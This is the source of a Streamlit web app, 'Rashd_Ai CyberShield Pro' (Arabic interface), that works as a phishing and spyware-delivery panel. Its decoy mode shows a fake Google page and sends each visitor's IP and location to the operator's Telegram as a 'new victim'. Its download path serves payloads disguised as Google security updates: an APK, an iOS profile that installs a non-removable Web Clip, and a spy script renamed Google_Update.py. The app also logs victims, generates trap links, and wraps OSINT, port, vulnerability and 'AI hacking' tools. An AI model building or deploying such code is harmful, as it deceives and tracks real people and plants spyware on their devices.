import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# إعداد متغيرات البيئة من config لضمان عمل المكتبات الخارجية
os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")

# استيراد الوحدات الخاصة بالأدوات (مع معالجة الخطأ إذا لم تكن موجودة)
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}. سيتم تشغيل الأدوات الأساسية فقط.")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# تصميم الواجهة الاحترافية (CSS)
st.markdown("""
    <style>
    .main {
        background-color: #0e1117;
    }
    .stButton>button {
        width: 100%;
        border-radius: 5px;
        height: 3em;
        background-color: #262730;
        color: white;
        border: 1px solid #4b4b4b;
    }
    .stButton>button:hover {
        background-color: #ff4b4b;
        border: 1px solid #ff4b4b;
    }
    .reportview-container .main .block-container {
        padding-top: 2rem;
    }
    div[data-testid="stMetricValue"] {
        font-size: 24px;
        color: #ff4b4b;
    }
    /* إخفاء واجهة Streamlit تماماً في وضع التمويه */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp [data-testid="stToolbar"] {display: none;}
    .stApp [data-testid="stDecoration"] {display: none;}
    .stApp [data-testid="stStatusWidget"] {display: none;}
    #manage-app-button {display: none !important;}
    </style>
    """, unsafe_allow_html=True)

# دالة جلب الـ IP العام الحقيقي (Public IP)
def get_real_public_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            ip = headers["X-Forwarded-For"].split(",")[0].strip()
            if not ip.startswith(("10.", "172.", "192.168.")):
                return ip
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        return
        
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass

    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📍 عنوان IP: {ip}
🌍 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏢 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except:
        pass

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    client_ip = get_real_public_ip()
    trap_name = query_params.get("trap", "Google Decoy")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name)
        st.session_state.alert_sent = True

    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    st.components.v1.html(html_content, height=1000, scrolling=False)
    st.stop()

# معالجة طلبات التحميل المباشرة (أندرويد، آيفون، كمبيوتر)
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = get_real_public_ip()
    send_telegram_alert(ip, f"Download ({device})", device)
    
    if device == "android":
        file_name = "Google_Security_Update.apk"
        # محتوى APK وهمي (في الواقع يجب أن يكون ملف APK حقيقي تم بناؤه مسبقاً)
        content = b"Fake APK Content for Google Update"
        mime = "application/vnd.android.package-archive"
    elif device == "ios":
        file_name = "Google_Security.mobileconfig"
        # هيكلية mobileconfig احترافية لزرع Web Clip
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS Devices</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?decoy=google&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <false/>
            <key>FullScreen</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
        mime = "application/x-apple-aspen-config"
    else:
        file_name = "Google_Update.py"
        if os.path.exists("spy_full.py"):
            with open("spy_full.py", "r") as f:
                content = f.read().encode('utf-8')
        else:
            content = b"print('Google Update Service Started...')"
        mime = "application/octet-stream"
            
    st.download_button("بدء التحميل الآمن", content, file_name=file_name, mime=mime)
    st.stop()

# --- الواجهة الرئيسية للمطور ---
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🛡️ تسجيل الدخول - Rashd_Ai")
    with st.form("login_form"):
        user = st.text_input("اسم المستخدم")
        pw = st.text_input("كلمة المرور", type="password")
        if st.form_submit_button("دخول"):
            if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("بيانات خاطئة")
    st.stop()

# --- تصميم القائمة الجانبية الاحترافية ---
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
    st.title("CyberShield Pro")
    st.markdown("---")
    
    menu = st.radio("القائمة الرئيسية", [
        "📊 لوحة التحكم", 
        "🔍 استخبارات OSINT", 
        "🛡️ فحص أمني", 
        "🧠 ذكاء اصطناعي", 
        "🎯 نظام المصيدة",
        "⚙️ الإعدادات"
    ])
    
    st.markdown("---")
    if st.button("🚪 تسجيل الخروج"):
        st.session_state.authenticated = False
        st.rerun()

# --- 1. لوحة التحكم (Dashboard) ---
if menu == "📊 لوحة التحكم":
    st.header("📊 لوحة التحكم والإحصائيات")
    victims = victim_logger.get_all_victims()
    
    col1, col2, col3, col4 = st.columns(4)
    with col1:
        st.metric("إجمالي الضحايا", len(victims))
    with col2:
        st.metric("عمليات اليوم", "5")
    with col3:
        st.metric("أدوات نشطة", "18")
    with col4:
        st.metric("حالة النظام", "متصل ✅")
        
    st.subheader("🎯 آخر الضحايا المكتشفين")
    if victims:
        st.table(victims[:5])
    else:
        st.info("لا يوجد ضحايا مسجلين بعد.")
        
    st.subheader("💬 مساعد Rashd_Ai السريع")
    if "messages" not in st.session_state:
        st.session_state.messages = []
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except:
                response = f"أنا مساعدك الذكي Rashd_Ai. كيف يمكنني خدمتك في '{prompt}'؟"
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

# --- 2. استخبارات OSINT ---
elif menu == "🔍 استخبارات OSINT":
    st.header("🔍 أدوات الاستخبارات مفتوحة المصدر")
    osint_tabs = st.tabs(["🌐 دومين", "👤 مستخدم", "📧 إيميل", "📱 هاتف", "📍 موقع", "🔎 Google Dork", "🌑 Dark Web"])
    
    with osint_tabs[0]:
        domain = st.text_input("أدخل اسم الدومين")
        if st.button("تحليل الدومين"):
            try:
                st.write("WHOIS", domain_osint.whois_lookup(domain))
                st.write("DNS", domain_osint.dns_lookup(domain))
            except: st.error("الأداة غير متوفرة")
            
    with osint_tabs[1]:
        user = st.text_input("أدخل اسم المستخدم")
        if st.button("بحث عن المستخدم"):
            try: st.write(username_osint.username_search(user))
            except: st.error("الأداة غير متوفرة")

    with osint_tabs[2]:
        email = st.text_input("أدخل البريد الإلكتروني")
        if st.button("بحث عن الإيميل"):
            try: st.write(email_osint.search_email(email))
            except: st.error("الأداة غير متوفرة")

    with osint_tabs[3]:
        phone = st.text_input("أدخل رقم الهاتف")
        if st.button("بحث عن الهاتف"):
            try: st.write(phone_osint.lookup(phone))
            except: st.error("الأداة غير متوفرة")

    with osint_tabs[4]:
        ip_geo = st.text_input("أدخل IP لتحديد موقعه")
        if st.button("تحديد الموقع"):
            try: st.write(geoip_osint.get_geo_info(ip_geo))
            except: st.error("الأداة غير متوفرة")

    with osint_tabs[5]:
        dork = st.text_input("الكلمة المفتاحية للـ Dorks")
        if st.button("توليد Dorks"):
            try: st.write(google_dork.generate_dorks(dork))
            except: st.error("الأداة غير متوفرة")

    with osint_tabs[6]:
        dark = st.text_input("بحث في الدارك ويب")
        if st.button("بدء البحث"):
            try: st.write(darkweb_search.search(dark))
            except: st.error("الأداة غير متوفرة")

# --- 3. فحص أمني ---
elif menu == "🛡️ فحص أمني":
    st.header("🛡️ أدوات الفحص الأمني والتقني")
    sec_tabs = st.tabs(["🔍 فحص مواقع", "🔌 منافذ", "⚠️ ثغرات", "🗺 خريطة شبكة", "🏗️ سطح هجوم", "📄 تقارير"])
    
    with sec_tabs[0]:
        url = st.text_input("رابط الموقع للفحص")
        if st.button("بدء فحص الموقع"):
            try: st.write(website_scan.detect_tech(url))
            except: st.error("الأداة غير متوفرة")

    with sec_tabs[1]:
        port_ip = st.text_input("IP لفحص المنافذ")
        if st.button("فحص المنافذ"):
            try: st.write(port_scanner.scan(port_ip))
            except: st.error("الأداة غير متوفرة")

    with sec_tabs[2]:
        vuln_ip = st.text_input("الهدف لفحص الثغرات")
        if st.button("فحص الثغرات"):
            try: st.write(vuln_scanner.scan(vuln_ip))
            except: st.error("الأداة غير متوفرة")

    with sec_tabs[3]:
        net_ip = st.text_input("الشبكة لرسم خريطتها")
        if st.button("رسم الخريطة"):
            try:
                path = network_mapper.map_network(net_ip)
                if path: st.image(path)
            except: st.error("الأداة غير متوفرة")

    with sec_tabs[4]:
        attack_ip = st.text_input("الهدف لتحليل سطح الهجوم")
        if st.button("تحليل السطح"):
            try: st.write(attack_surface.analyze(attack_ip))
            except: st.error("الأداة غير متوفرة")

    with sec_tabs[5]:
        if st.button("توليد تقرير PDF شامل"):
            try:
                path = report_generator.generate_full_report()
                if path:
                    with open(path, "rb") as f:
                        st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
            except: st.error("الأداة غير متوفرة")

# --- 4. ذكاء اصطناعي ---
elif menu == "🧠 ذكاء اصطناعي":
    st.header("🧠 أدوات التحليل بالذكاء الاصطناعي")
    ai_tabs = st.tabs(["🧠 تحليل بيانات", "🤖 مساعد هجوم", "🤖 تحليل تهديدات", "💡 مستشار اختراق"])
    
    with ai_tabs[0]:
        data = st.text_area("أدخل البيانات للتحليل")
        if st.button("بدء التحليل"):
            try: st.write(ai_analysis.analyze_data(data))
            except: st.error("الأداة غير متوفرة")

    with ai_tabs[1]:
        prompt = st.text_input("اسأل مساعد الهجوم الذكي")
        if st.button("إرسال"):
            try: st.write(AIHackingAssistant().chat(prompt))
            except: st.error("الأداة غير متوفرة")

    with ai_tabs[2]:
        threat = st.text_area("بيانات التهديد للتحليل")
        if st.button("تحليل التهديد"):
            try: st.write(ai_threat.analyze(threat))
            except: st.error("الأداة غير متوفرة")

    with ai_tabs[3]:
        pentest = st.text_input("الهدف لخطة الاختراق")
        if st.button("توليد الخطة"):
            try: st.write(ai_pentest.generate_plan(pentest))
            except: st.error("الأداة غير متوفرة")

# --- 5. نظام المصيدة ---
elif menu == "🎯 نظام المصيدة":
    st.header("🎯 نظام المصيدة والتمويه الذكي")
    col1, col2 = st.columns(2)
    with col1:
        st.subheader("توليد رابط فخ")
        trap_id = st.text_input("اسم المصيدة", value="Google_Trap")
        base_url = "https://rashdai.streamlit.app/"
        decoy_url = f"{base_url}?decoy=google&trap={trap_id}"
        st.code(decoy_url, language="text")
        st.info("هذا الرابط يظهر كصفحة Google ويقوم بالتحميل التلقائي.")
        
    with col2:
        st.subheader("سجل الضحايا")
        if st.button("تحديث السجل"):
            victims = victim_logger.get_all_victims()
            if victims: st.table(victims)
            else: st.info("لا يوجد ضحايا.")

# --- 6. الإعدادات ---
elif menu == "⚙️ الإعدادات":
    st.header("⚙️ إعدادات المنصة")
    st.success("تم دمج كافة مفاتيح الـ API الخاصة بك بنجاح من خلال Secrets.")
    st.info(f"إصدار المنصة: 2.1.0 (Mobile Support Edition)")
    st.markdown("---")
    st.write("المطور: Rashd_Ai")
